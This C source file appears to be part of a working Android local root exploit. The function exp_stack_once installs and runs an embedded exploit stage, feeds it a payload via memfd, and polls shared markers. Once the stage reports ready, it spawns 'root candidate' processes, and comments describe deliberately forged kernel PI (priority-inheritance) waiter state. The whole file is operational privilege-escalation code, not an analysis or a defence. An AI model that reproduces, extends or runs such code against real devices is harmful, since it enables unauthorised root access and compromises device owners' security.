#include "common.h"

#define EXP_BUFFER_BYTES 128
#define EXP_DONE_OFFSET EXP_BUFFER_BYTES
#define EXP_DONE_MARKER 0xa5
#define EXP_READY_OFFSET (EXP_BUFFER_BYTES + 1)
#define EXP_READY_MARKER 0x5a
#define EXP_DONE_POLLS 4000

pid_t g_exp32_child = -1;
int g_spawn_root_on_stage_ready;
int g_spawn_root_burst;

int exp_stack_once(uint64_t *buffer) {
  if (!buffer) {
    pr_warning("Exp_stack_once: NULL buffer\n");
    return -1;
  }

  static char exp_path[512];
  if (!exp_path[0]) {
    snprintf(exp_path, sizeof(exp_path), "%s.%d", EXP32_LOCAL, getpid());
  }

  if (!install_embedded_exp32(exp_path)) {
    pr_warning("Exp_stack_once: embedded exp32 install failed errno=%d\n",
               errno);
    return -2;
  }

  int mfd = (int)syscall(__NR_memfd_create, "exp_buf", 0);
  if (mfd < 0) {
    pr_warning("Exp_stack_once: memfd_create errno=%d\n", errno);
    return -1;
  }
  ssize_t written = write(mfd, buffer, EXP_BUFFER_BYTES);
  if (written != EXP_BUFFER_BYTES) {
    pr_warning("Exp_stack_once: memfd write %zd errno=%d\n",
               written, errno);
    close(mfd);
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    pr_warning("Exp_stack_once: fork errno=%d\n", errno);
    close(mfd);
    return -1;
  }

  g_exp32_child = pid;
  if (pid == 0) {
    char fd_arg[16];
    snprintf(fd_arg, sizeof(fd_arg), "%d", mfd);
    execl(exp_path, exp_path, fd_arg, (char *)NULL);
    pr_warning("Exp_stack_once: execl errno=%d\n", errno);
    _exit(127);
  }

  int status = 0;
  int child_not_waitable = 0;
  int ready_handled = 0;
  for (int i = 0; i < EXP_DONE_POLLS; i++) {
    if (!ready_handled && g_spawn_root_on_stage_ready) {
      unsigned char ready = 0;
      ssize_t rr = pread(mfd, &ready, sizeof(ready), EXP_READY_OFFSET);
      if (rr == (ssize_t)sizeof(ready) && ready == EXP_READY_MARKER) {
        ready_handled = 1;
#ifndef ROOT_SPAWN_AFTER_STAMP
        int burst = g_spawn_root_burst > 0 ? g_spawn_root_burst : 1;
        pr_info("Exp_stack_once: stage %d ready; spawning %d root "
                "candidate(s) at task-list tail\n", pid, burst);
        for (int j = 0; j < burst; j++) root_chain_spawn_child();
        g_spawn_root_on_stage_ready = 0;
        usleep(40000);
#endif
      }
    }

    unsigned char marker = 0;
    ssize_t nr = pread(mfd, &marker, sizeof(marker), EXP_DONE_OFFSET);
    if (nr == (ssize_t)sizeof(marker) && marker == EXP_DONE_MARKER) {
      /* The stage parks its forged waiter in userspace and must remain alive.
       * Do not signal it here: scheduler signal handling can revisit the
       * deliberately forged PI state. */
      pr_info("Exp_stack_once: stage %d completed and parked\n", pid);
      close(mfd);
      return 0;
    }

    pid_t waited = child_not_waitable ? 0 : waitpid(pid, &status, WNOHANG);
    if (waited == pid) {
      close(mfd);
      if (WIFEXITED(status)) {
        int exit_code = WEXITSTATUS(status);
        if (exit_code == 127) {
          pr_warning("Exp_stack_once: executable not found at %s\n",
                     exp_path);
          return -2;
        }
        pr_warning("Exp_stack_once: stage exited before parking, status=%d\n",
                   exit_code);
        return exit_code ? exit_code : -1;
      }
      if (WIFSIGNALED(status)) {
        pr_warning("Exp_stack_once: child killed by signal %d\n",
                   WTERMSIG(status));
      }
      return -1;
    }
    if (waited < 0 && errno == ECHILD) {
      /* Some Android shell/supervisor paths make descendants non-waitable
       * even while the exec'd stage is alive.  The shared completion byte is
       * the authoritative success signal; keep polling it instead of
       * discarding a stage that is about to park cleanly. */
      child_not_waitable = 1;
      pr_info("Exp_stack_once: stage %d is not waitable; polling completion "
              "marker\n", pid);
    } else if (waited < 0 && errno != EINTR) {
      pr_warning("Exp_stack_once: waitpid errno=%d\n", errno);
      close(mfd);
      return -1;
    }
    usleep(10000);
  }

  close(mfd);
  pr_warning("Exp_stack_once: stage %d did not report completion\n", pid);
  return -1;
}
